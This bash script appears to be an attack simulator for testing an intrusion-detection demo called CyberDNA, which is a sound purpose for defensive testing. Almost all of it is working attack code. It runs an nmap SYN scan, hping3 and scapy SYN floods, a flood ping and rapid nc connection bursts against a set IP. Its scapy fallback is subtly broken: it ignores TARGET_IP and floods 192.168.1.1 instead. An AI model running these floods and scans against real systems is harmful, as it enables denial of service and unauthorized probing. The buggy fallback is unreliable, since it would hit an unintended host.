#!/bin/bash
# Attack Simulator for CyberDNA Demo
# Run these from a SEPARATE terminal while sentinel is running

TARGET_IP="10.131.75.222"  # Change to your router or target IP

echo "=============================================="
echo "🎯 CyberDNA Attack Simulator"
echo "=============================================="
echo ""
echo "Choose an attack to simulate:"
echo ""
echo "1) Port Scan (Nmap) - Will trigger PORT_SCAN"
echo "2) SYN Flood - Will trigger SMALL_PKT_FLOOD"
echo "3) Ping Flood - Will trigger DoS detection"
echo "4) Rapid Connections - Will trigger ANOMALY"
echo "5) All Attacks (Sequential)"
echo ""
read -p "Select (1-5): " choice

case $choice in
    1)
        echo ""
        echo "🔍 Launching Port Scan..."
        echo "Target: $TARGET_IP"
        echo "This will scan 100 ports and trigger PORT_SCAN alert"
        echo ""
        sudo nmap -sS -p 1-100 -T4 --max-retries 0 $TARGET_IP
        echo ""
        echo "✅ Port scan complete! Check CyberDNA for 🚨 [PORT_SCAN] alert"
        ;;
    
    2)
        echo ""
        echo "💥 Launching SYN Flood..."
        echo "Target: $TARGET_IP:80"
        echo "Duration: 10 seconds"
        echo "This will trigger SMALL_PKT_FLOOD alert"
        echo ""
        
        # Check if hping3 is available
        if command -v hping3 &> /dev/null; then
            timeout 10 sudo hping3 -S -p 80 --flood $TARGET_IP 2>/dev/null
        else
            echo "⚠️  hping3 not installed. Using scapy alternative..."
            python3 << 'EOF'
from scapy.all import *
import time
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.1"
print(f"Flooding {target}:80 with SYN packets...")

start = time.time()
count = 0
while time.time() - start < 10:
    ip = IP(dst=target)
    tcp = TCP(sport=RandShort(), dport=80, flags="S")
    send(ip/tcp, verbose=0)
    count += 1
    if count % 100 == 0:
        print(f"Sent {count} packets...", end='\r')

print(f"\nSent {count} SYN packets in 10 seconds")
EOF
        fi
        
        echo ""
        echo "✅ SYN flood complete! Check CyberDNA for 🚨 [SMALL_PKT_FLOOD] alert"
        ;;
    
    3)
        echo ""
        echo "📡 Launching Ping Flood..."
        echo "Target: $TARGET_IP"
        echo "Duration: 10 seconds"
        echo ""
        
        # High-rate pings
        timeout 10 sudo ping -f -c 500 $TARGET_IP 2>/dev/null
        
        echo ""
        echo "✅ Ping flood complete! Check CyberDNA for anomaly alert"
        ;;
    
    4)
        echo ""
        echo "🔄 Launching Rapid Connections..."
        echo "Target: $TARGET_IP:80"
        echo "This creates many quick connections"
        echo ""
        
        for i in {1..50}; do
            timeout 0.1 nc -zv $TARGET_IP 80 2>/dev/null &
            timeout 0.1 nc -zv $TARGET_IP 443 2>/dev/null &
            timeout 0.1 nc -zv $TARGET_IP 22 2>/dev/null &
        done
        wait
        
        echo ""
        echo "✅ Rapid connections complete! Check CyberDNA for alerts"
        ;;
    
    5)
        echo ""
        echo "🎪 Running ALL attacks sequentially..."
        echo ""
        
        echo "1/4: Port Scan (20 seconds)..."
        sudo nmap -sS -p 1-100 -T4 $TARGET_IP > /dev/null 2>&1
        sleep 5
        
        echo "2/4: SYN Flood (10 seconds)..."
        if command -v hping3 &> /dev/null; then
            timeout 10 sudo hping3 -S -p 80 --flood $TARGET_IP 2>/dev/null
        fi
        sleep 5
        
        echo "3/4: Ping Flood (10 seconds)..."
        timeout 10 sudo ping -f -c 300 $TARGET_IP 2>/dev/null
        sleep 5
        
        echo "4/4: Rapid Connections..."
        for i in {1..30}; do
            timeout 0.1 nc -zv $TARGET_IP 80 2>/dev/null &
        done
        wait
        
        echo ""
        echo "✅ All attacks complete! Check CyberDNA output"
        ;;
    
    *)
        echo "Invalid selection"
        exit 1
        ;;
esac

echo ""
echo "=============================================="
echo "📊 Attack simulation finished"
echo "Check your CyberDNA terminal for alerts!"
echo "=============================================="
